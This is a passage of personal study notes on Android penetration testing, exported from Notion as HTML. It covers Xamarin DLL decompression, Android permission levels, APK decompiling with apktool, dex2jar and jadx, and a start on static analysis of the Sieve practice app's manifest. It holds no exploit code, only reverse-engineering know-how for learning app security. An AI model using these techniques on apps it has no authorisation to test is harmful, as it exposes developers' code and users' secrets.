src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%204.png"/></a></figure><p id="44f60594-8ff1-425d-b452-3449cc99fa07" class="">If you checked<mark class="highlight-red_background"> Jadx-gui</mark> you<mark class="highlight-red_background"> wont find the code just some statics</mark></p><figure id="bb247884-ab38-41b3-a720-3c6c00bd4c86" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%205.png"><img style="width:576px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%205.png"/></a></figure><p id="3fdce663-71f8-467f-8d6a-980fd2e85db1" class="">Code is stored in DLLs stored in the application</p><p id="169c1407-e119-4c8e-a613-ed15feb5eaf6" class="">so we first decompile it using <code>apktool d </code> </p><p id="06257d4b-c058-4e5e-b50e-8385dd1a54a0" class="">we find here the code we want to read</p><figure id="aabdd335-d83e-4db7-9a5e-1123a364f9ed" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%206.png"><img style="width:768px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%206.png"/></a></figure><p id="334ec7c1-3981-4ed3-b311-4eef5d7449ea" class="">first we need to use this script to<mark class="highlight-red_background"> de-compress</mark> them before reversing</p><figure id="3b3978c8-bd1a-4e73-bb97-d2df4a7de6a1"><a href="https://github.com/x41sec/tools/blob/master/Mobile/Xamarin/Xamarin_XALZ_decompress.py" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title"></div></div><div class="bookmark-href">https://github.com/x41sec/tools/blob/master/Mobile/Xamarin/Xamarin_XALZ_decompress.py</div></div></a></figure><p id="adb3f83d-fa44-4094-987a-a69c864fe493" class="">then use ⇒<code> dnSpy.exe</code> to reverse the DLL files and fetch the readable code</p></div></details></div></details></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">Security Architecture</summary><div class="indented"><p id="74621566-df81-475e-b334-ff07fd68b7eb" class=""><strong><mark class="highlight-blue">Android Security Architecture</mark></strong> built on <mark class="highlight-yellow">Linux based</mark> for OS and <mark class="highlight-yellow">android based</mark>.</p><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0"><mark class="highlight-yellow">Linux based</mark></summary><div class="indented"><p id="c91f3b13-1e37-4985-8356-f6ac3239fb00" class="">its built on the <code>UID</code> separation that aims to organize access ,resources and files of each app.</p><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="ed1422b3-1b81-43e0-a2df-82dcea37018d"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">All apps (either the default ones or installed by me) installed under the directory <code>/data/data.</code> Each app directory contains <mark class="highlight-brown_background">its own resources like databases images etc.</mark> and has its <mark class="highlight-brown_background">own user and group id </mark>and only the <span style="border-bottom:0.05em solid"><strong>owner</strong></span> can access this directory <code>rwx</code> and also the root.</div></figure><p id="506c2867-beb1-4a89-b680-45136bd65e61" class=""><mark class="highlight-orange">When an app is installed or uninstalled</mark> on the device, the<mark class="highlight-orange"> Package Manager updates this file</mark>  <code>/data/system/</code><code><mark class="highlight-pink">packages.xml</mark></code><mark class="highlight-pink"> </mark>to reflect the changes in the system’s package database. The file is essential for keeping track of the installed apps and their permissions.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="95071a09-9c4d-47fd-9218-496f8949b497" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27; standalone=&#x27;yes&#x27; ?&gt;
&lt;packages&gt;
    &lt;package name=&quot;com.example.app1&quot; codePath=&quot;/data/app/com.example.app1&quot; nativeLibraryPath=&quot;/data/app/com.example.app1/lib&quot; flags=&quot;...&quot;
        version=&quot;12345&quot; userId=&quot;10000&quot; installer=&quot;com.android.vending&quot;&gt;
        &lt;!-- More details about the package --&gt;
        &lt;sigs count=&quot;1&quot;&gt;
            &lt;cert index=&quot;...&quot; /&gt;
        &lt;/sigs&gt;
        &lt;perms&gt;
            &lt;item name=&quot;android.permission.CAMERA&quot; granted=&quot;true&quot; flags=&quot;0&quot; /&gt;
            &lt;item name=&quot;android.permission.INTERNET&quot; granted=&quot;true&quot; flags=&quot;0&quot; /&gt;
            &lt;!-- More permissions --&gt;
        &lt;/perms&gt;
        &lt;!-- More details about the package --&gt;
    &lt;/package&gt;

    &lt;package name=&quot;com.example.app2&quot; codePath=&quot;/data/app/com.example.app2&quot; nativeLibraryPath=&quot;/data/app/com.example.app2/lib&quot; flags=&quot;...&quot;
        version=&quot;67890&quot; userId=&quot;10001&quot; installer=&quot;com.android.vending&quot;&gt;
        &lt;!-- More details about the package --&gt;
        &lt;sigs count=&quot;1&quot;&gt;
            &lt;cert index=&quot;...&quot; /&gt;
        &lt;/sigs&gt;
        &lt;perms&gt;
            &lt;item name=&quot;android.permission.CAMERA&quot; granted=&quot;true&quot; flags=&quot;0&quot; /&gt;
            &lt;item name=&quot;android.permission.RECORD_AUDIO&quot; granted=&quot;false&quot; flags=&quot;0&quot; /&gt;
            &lt;!-- More permissions --&gt;
        &lt;/perms&gt;
        &lt;!-- More details about the package --&gt;
    &lt;/package&gt;
&lt;/packages&gt;</code></pre><p id="f5bbc12b-aa42-4161-83db-b8640cc37fda" class="">the content is something like is as we see<mark class="highlight-orange"> every app has its own </mark><code>userId</code> that can access the data belongs to this app only.</p></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0"><mark class="highlight-yellow">Android based</mark></summary><div class="indented"><p id="9b2bf506-49cc-45e9-a2ac-0fac56b21e8e" class="">it depends on the permissions located on the <code>android manifest.xml</code> file under <code>&lt;permission&gt;</code> &amp; <code>&lt;uses-permission&gt;</code> tags. </p><ul id="71dcccf7-19cb-4c19-bb43-f018369264e6" class="bulleted-list"><li style="list-style-type:disc"><code>&lt;permission&gt;</code> </li></ul><p id="45181523-5a90-414e-86f0-3a8787f475ea" class=""> <code><strong>&lt;permission&gt;</strong></code> is used <mark class="highlight-red_background">to define custom permissions that you create and control within your app</mark>. It does not request access to device features or data directly; instead, it sets up access controls within your app <span style="border-bottom:0.05em solid">or allows you to share functionality with other apps while maintaining controlled access</span>.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0e5f32de-e488-4263-be88-8a17e79dcc38" class="code"><code class="language-Java" style="white-space:pre-wrap;word-break:break-all">&lt;permission android:description=&quot;string resource&quot;
            android:icon=&quot;drawable resource&quot;
            android:label=&quot;string resource&quot;
            android:name=&quot;string&quot;
            android:permissionGroup=&quot;string&quot;
            android:protectionLevel=[&quot;normal&quot; | &quot;dangerous&quot; |
                                     &quot;signature&quot; | ...] /&gt;</code></pre><table id="1886f6fc-b2be-44a3-8560-b65d6e265c72" class="simple-table"><tbody><tr id="cc75bc03-02ed-4f9b-a912-726565f9d592"><td id="LQCq" class="block-color-gray" style="width:115.4666748046875px">Value</td><td id="KLbg" class="block-color-gray" style="width:635.0000610351562px">Meaning</td></tr><tr id="dd6b2d3b-f607-451b-b8cf-967b1df61867"><td id="LQCq" class="" style="width:115.4666748046875px"><code>&quot;normal&quot;</code></td><td id="KLbg" class="" style="width:635.0000610351562px">The<mark class="highlight-teal_background"> default value</mark>. A<mark class="highlight-teal_background"> lower-risk permission </mark>that gives requesting applications access to isolated application-level features with minimal risk to other applications, the system, or the user. The system automatically grants this type of permission to a requesting application at installation, <mark class="highlight-teal_background">without asking for the user&#x27;s explicit approval,</mark> though the user always has the option to review these permissions before installing.</td></tr><tr id="0fc3b894-46da-4ad0-82dd-d09f4ede6559"><td id="LQCq" class="" style="width:115.4666748046875px"><code>&quot;dangerous&quot;</code></td><td id="KLbg" class="" style="width:635.0000610351562px">A <mark class="highlight-red_background">higher-risk permission </mark>that gives a requesting application<mark class="highlight-red_background"> access to private user data or control over the device that can negatively impact the user</mark>. Because this type of permission introduces potential risk, the system might not automatically grant it to the requesting application. For example, any dangerous permissions requested by an application <mark class="highlight-red_background">might be displayed to the user and require confirmation before proceeding</mark>, or some other approach might be taken to avoid the user automatically granting the use of such facilities.</td></tr><tr id="9e0fbe94-51cf-4ca9-a7d8-dd4b2ede2ed9"><td id="LQCq" class="" style="width:115.4666748046875px"><code>&quot;signature&quot;</code></td><td id="KLbg" class="" style="width:635.0000610351562px">A <mark class="highlight-yellow_background">permission </mark>that the system grants only<mark class="highlight-yellow_background"> if the requesting application is signed with the s</mark><mark class="highlight-red_background">ame certificate</mark><mark class="highlight-yellow_background"> as the application that declared the permission.</mark> If the<span style="border-bottom:0.05em solid"> certificates match</span>, <span style="border-bottom:0.05em solid">the system automatically grants the permission</span> <mark class="highlight-yellow_background">without notifying the user or asking for the user&#x27;s explicit approval.</mark></td></tr><tr id="79579b6f-474b-418d-8340-71ad97e9d50d"><td id="LQCq" class="" style="width:115.4666748046875px"><code>&quot;knownSigner&quot;</code></td><td id="KLbg" class="" style="width:635.0000610351562px">A permission that the system grants only if the requesting application <mark class="highlight-yellow_background">is signed</mark> with<mark class="highlight-yellow_background"> </mark><mark class="highlight-yellow_background"><a href="https://developer.android.com/guide/topics/permissions/defining#grant-signature-permissions">an allowed certificate</a></mark><mark class="highlight-yellow_background">.</mark> If the requester&#x27;s certificate is listed, the system automatically grants the permission without notifying the user or asking for the user&#x27;s explicit approval.</td></tr><tr id="a54851b7-78c8-4f66-a32e-b846904da818"><td id="LQCq" class="" style="width:115.4666748046875px"><code>&quot;signatureOrSystem&quot;</code></td><td id="KLbg" class="" style="width:635.0000610351562px"><em>Old synonym for </em><code><em>&quot;signature|privileged&quot;</em></code><em>. Deprecated in API level 23.</em><br/>A permission that the system grants only to applications<br/><mark class="highlight-red_background"> that are in a dedicated folder on the Android system image (SYSTEM APK)  </mark><mark class="highlight-red_background"><em>or</em></mark><mark class="highlight-red_background"> that are signed with the same certificate as the application that declared the permission.</mark> Avoid using this option, as the <code>&quot;signature&quot;</code> protection level is sufficient for most needs and works regardless of where apps are installed.<br/>The <br/><code>&quot;signatureOrSystem&quot;</code> permission is used for certain special situations where multiple vendors have applications built into a system image and need to share specific features explicitly because they are being built together.</td></tr></tbody></table><ul id="f90916dd-e32b-4b7e-ba04-baa02fd1f001" class="bulleted-list"><li style="list-style-type:disc"><code>&lt;uses-permission&gt;</code></li></ul><p id="c63f1c8d-5230-4510-ba10-b2a34c9a5647" class=""><code><strong>&lt;uses-permission&gt;</strong></code> is used<mark class="highlight-red_background"> to request permissions</mark> required by your app to access device features or data. It is a declaration that informs the Android system of your app&#x27;s permission requirements and is presented to the user during installation for their approval.</p><p id="75868707-dabc-47b1-8a22-62e4899cdf00" class="">Specifies a system permission that the user must grant for the app to operate correctly. The user grants permissions when the application installs, on devices running Android 5.1 and lower, or while the app runs, on devices running Android 6.0 and higher.</p><figure id="4de4d2bd-087a-4d3a-ac8a-c1f2b8af9769" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%207.png"><img style="width:1326px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%207.png"/></a></figure><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="83b81de8-0ac1-490d-b1b8-404b1c24b2db" class="code"><code class="language-Java" style="white-space:pre-wrap;word-break:break-all">&lt;uses-permission
     android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;
     android:maxSdkVersion=&quot;18&quot; /&gt;</code></pre><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">H<strong>ow can APP 1 read data from APP 2?</strong></summary><div class="indented"><p id="c2e884db-cd64-4edb-8b9b-e9236c224cf1" class="">To enable one app to access data or perform specific actions in another app, you can <mark class="highlight-orange">define a </mark><mark class="highlight-pink">custom permission</mark><mark class="highlight-orange"> using the &lt;</mark><mark class="highlight-pink">permission</mark><mark class="highlight-orange">&gt; element in the manifest </mark>of the app providing the data or functionality, and then use the<mark class="highlight-orange"> &lt;uses-permission&gt; element in the manifest of the app that wants to access that data or functionality</mark>.</p><ol type="1" id="86f20028-131d-4878-9521-92947ab7f535" class="numbered-list" start="1"><li><strong>Provider App (Providing Data):</strong></li></ol><p id="1120c0d7-34bf-460c-b26d-2ba1fd32022b" class="">Assume you have an app that provides some sensitive data, and <mark class="highlight-orange">you want to allow other apps</mark> to access this data only if they have a specific permission.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ed057d17-d0f7-4731-b95d-f94a376dafba" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all"> &lt;permission
        android:name=&quot;com.example.providerapp.PERMISSION_ACCESS_DATA&quot;
        android:label=&quot;Access Provider App Data&quot;
        android:protectionLevel=&quot;dangerous&quot; /&gt;</code></pre><ol type="1" id="beec1f2a-6af9-402c-9090-485102c9333b" class="numbered-list" start="2"><li><strong>Client App (Accessing Data):</strong></li></ol><p id="7ad207ab-4a44-4bfa-8cd2-39b8c29828d9" class="">Assume you have <mark class="highlight-orange">another app that wants to access the data provided</mark> by the first app. This app needs to request and be granted the custom permission defined in the provider app’s manifest.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="31ecb2cf-cc55-459c-9e71-aca991c323ee" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all"> &lt;!-- Request permission to access data from the Provider App --&gt;
    &lt;uses-permission android:name=&quot;com.example.providerapp.PERMISSION_ACCESS_DATA&quot; /&gt;</code></pre><blockquote id="0dbe5c4d-66ad-4d69-b0af-e84fa4b52ee7" class="">When the client app is installed, it will need to explicitly request the <code>PERMISSION_ACCESS_DATA</code> permission from the user. If the user grants the permission, the client app can then access the data or perform the allowed actions provided by the provider app.</blockquote></div></details></div></details></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0"><strong>D</strong>ecompiling with APKTool</summary><div class="indented"><ul id="1f4ca603-b354-42c5-a074-7754e2b03d50" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-yellow">APKTool </mark>is a popular open-source tool used to<mark class="highlight-yellow"> decompile and reverse-engineer Android APK files</mark>. It allows developers and researchers to extract the APK’s <strong>resources</strong>, <strong>manifest</strong>, and <strong>smali code (Dalvik bytecode)</strong> into a <span style="border-bottom:0.05em solid">human-readable format</span>. </li></ul><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="6fcd0d44-5770-4ff5-9960-940c66f79f93"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><mark class="highlight-blue">apktool </mark>⇒ can decompile and rebuild applications <code>apktool d app.apk</code> to decompile add <code>-s</code> to include classes.dex without decompiling,  <code>apktool b dirAPK</code> to build.</div></figure><ul id="89e88ac6-649e-4a88-bf1e-30919d4c4474" class="toggle"><li><details open=""><summary><mark class="highlight-blue"><strong>Old school method for Reversing</strong></mark></summary><p id="13a7c033-a28e-4691-8436-2a7ae6ebaac9" class="">⇒ We use <code>apktool</code> to decompile and built apps </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="72d2214c-a973-410c-a598-9f45ca47b28c" class="code"><code class="language-Bash">apktool d apkName         #d for decompile

apktool d -s apkName         #to let classes.dex without decombiling</code></pre><p id="c1c5548e-148b-41d5-be00-1f1b4c6a58bb" class="">To make <code>classes.dex</code> reversible, we use:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="423af52a-be06-4fac-945c-5a4e190df036" class="code"><code class="language-Bash">d2j-dex2jar classes.dex  #it turns dex to jar file </code></pre><p id="936f6f65-d627-42ce-b31b-ca7186b3d47b" class="">and then we can decompile jar:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="99cbc514-22c2-4374-beb7-b52c51a8574b" class="code"><code class="language-Bash">jadx-gui classes-jar-file.jar</code></pre></details></li></ul><h3 id="be7d5fe7-5f79-4009-9546-f39ee5ff09a5" class=""><mark class="highlight-blue"><strong>Fast methods for Reversing</strong></mark></h3><ol type="1" id="43292922-8e96-4aa2-b87c-b4630eeb673c" class="numbered-list" start="1"><li>we directly use <code>jadx-gui</code> <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="020dcacb-224a-44ac-86cf-f6f7bab15771" class="code"><code class="language-Bash">jadx-gui apkName</code></pre></li></ol><ol type="1" id="3e10bbf8-6938-4e8a-9288-9da5c9b09b77" class="numbered-list" start="2"><li>By using <mark class="highlight-yellow">vs code</mark>, it has <code>apkLap</code> extension that can be used in reversing. To use it press <code>ctrl+shift+p</code> then <mark class="highlight-yellow">open apk</mark> then choose the file </li></ol><figure id="a448ed93-af54-4dce-8a43-7766498e8e41" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%208.png"><img style="width:624px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%208.png"/></a></figure><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="8ee6ebff-9787-49a4-bfc5-63724838f37d"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">APKLab vsCode extension is <mark class="highlight-red_background">better than apktool in dealing with decombiling and building after editing the smali</mark></div></figure><blockquote id="a1920a2f-ae93-4210-88ee-9b11452c9969" class="">we usually care about <mark class="highlight-pink">Assets</mark>, <mark class="highlight-pink">lib</mark>, <mark class="highlight-pink">META-INF</mark>, <mark class="highlight-pink">AndroidManifest.xml</mark>,<mark class="highlight-pink"> strings.xml</mark>.</blockquote></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0"><mark class="highlight-red"><strong>Static Analysis</strong></mark></summary><div class="indented"><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">Definition </summary><div class="indented"><ul id="50a7cfc9-a10e-45f2-a604-69fc741a947d" class="bulleted-list"><li style="list-style-type:disc">Known as &quot;<mark class="highlight-pink">white-box</mark>&quot; analysis, involves <mark class="highlight-pink">examining the source code</mark>,<mark class="highlight-pink"> binary code</mark>, or <mark class="highlight-pink">application package (APK) file without executing the app</mark>. It looks for <em><span style="border-bottom:0.05em solid">vulnerabilities</span></em>,<em><span style="border-bottom:0.05em solid"> security issues</span></em>, and <em><span style="border-bottom:0.05em solid">potential weaknesses in the code and resources</span></em>.</li></ul><ul id="ccda6d91-7ce5-47fe-94d9-713a3ef6aecd" class="bulleted-list"><li style="list-style-type:disc">Static analysis is typically performed during the<mark class="highlight-pink"> early stages of app development </mark>or <mark class="highlight-pink">before the app is deployed</mark>.</li></ul><ul id="cb324692-2cda-46fc-b482-3da7a9bf93de" class="bulleted-list"><li style="list-style-type:disc">Static analysis is effective at identifying potential security issues within the code, such as <mark class="highlight-pink">hardcoded credentials</mark>, <mark class="highlight-pink">insecure data storage</mark>, <mark class="highlight-pink">insecure code patterns or any insecure component implementations</mark>.</li></ul><ul id="6130061d-455b-4aa1-a730-bf6aadc72a94" class="bulleted-list"><li style="list-style-type:disc">Static analysis <mark class="highlight-pink">can identify issues that might not be apparent during dynamic analysis</mark>, such as <em><span style="border-bottom:0.05em solid">hardcoded secrets or hidden vulnerabilities in the code</span></em></li></ul></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0"><mark class="highlight-red">AndroidManifest.xml</mark>  </summary><div class="indented"><p id="de494aae-9bec-45b8-9e43-f5a196b12f83" class="">The <code>AndroidManifest.xml</code> file is a critical configuration file in an Android application. It&#x27;s<mark class="highlight-orange"> located in the root directory of the app&#x27;s source code</mark> and<mark class="highlight-pink"><em><span style="border-bottom:0.05em solid"><strong> contains essential information about the app&#x27;s structure, components, permissions, and metadata</strong></span></em></mark>.</p><p id="8711e68f-0bf9-478d-942a-84bb0f088bcd" class="">
</p><figure id="69230a1a-aa66-4ecf-8133-f3fa1c77664b" class="image" style="text-align:center"><a href="https://miro.medium.com/v2/resize:fit:875/1*qPmNJ_X5cXywkSlhBJRnxg.png"><img style="width:700px" src="https://miro.medium.com/v2/resize:fit:875/1*qPmNJ_X5cXywkSlhBJRnxg.png"/></a></figure><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e5a8e657-2d02-4f36-a75e-b0e62d1f0470" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:versionCode=&quot;1&quot; android:versionName=&quot;1.0&quot; package=&quot;com.mwr.example.sieve&quot;&gt;</code></pre><blockquote id="24181264-633c-4c99-bf25-6c0e0dad6b9d" class="">The <code>package</code> attribute in the Android manifest file <mark class="highlight-orange">specifies the unique identifier for the Android application</mark>. The package name is used to uniquely identify the app on the device and in the Google Play Store which is here “<em><span style="border-bottom:0.05em solid"><strong>com.mwr.example.sieve</strong></span></em>”.</blockquote><p id="6129a9a7-8c4e-4d6f-81e8-3582921654ab" class="">
</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b21ec7af-a085-4ee3-a494-eada2f189109" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;uses-permission android:name=&quot;android.permission.READ_EXTERNAL_STORAGE&quot;/&gt;
&lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;/&gt;
&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;/&gt;</code></pre><blockquote id="674a55d9-6e85-4f50-ab29-5c5833f91c10" class="">Review these permissions to ensure they are necessary and not overly permissive.</blockquote><p id="6a694839-b748-4094-a8ba-a9745f2f1b2d" class="">
</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f7b07335-83f5-4ead-a109-23ab39ba9f8f" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;permission android:label=&quot;Allows reading of the Key in Sieve&quot; android:name=&quot;com.mwr.example.sieve.READ_KEYS&quot; android:protectionLevel=&quot;dangerous&quot;/&gt;
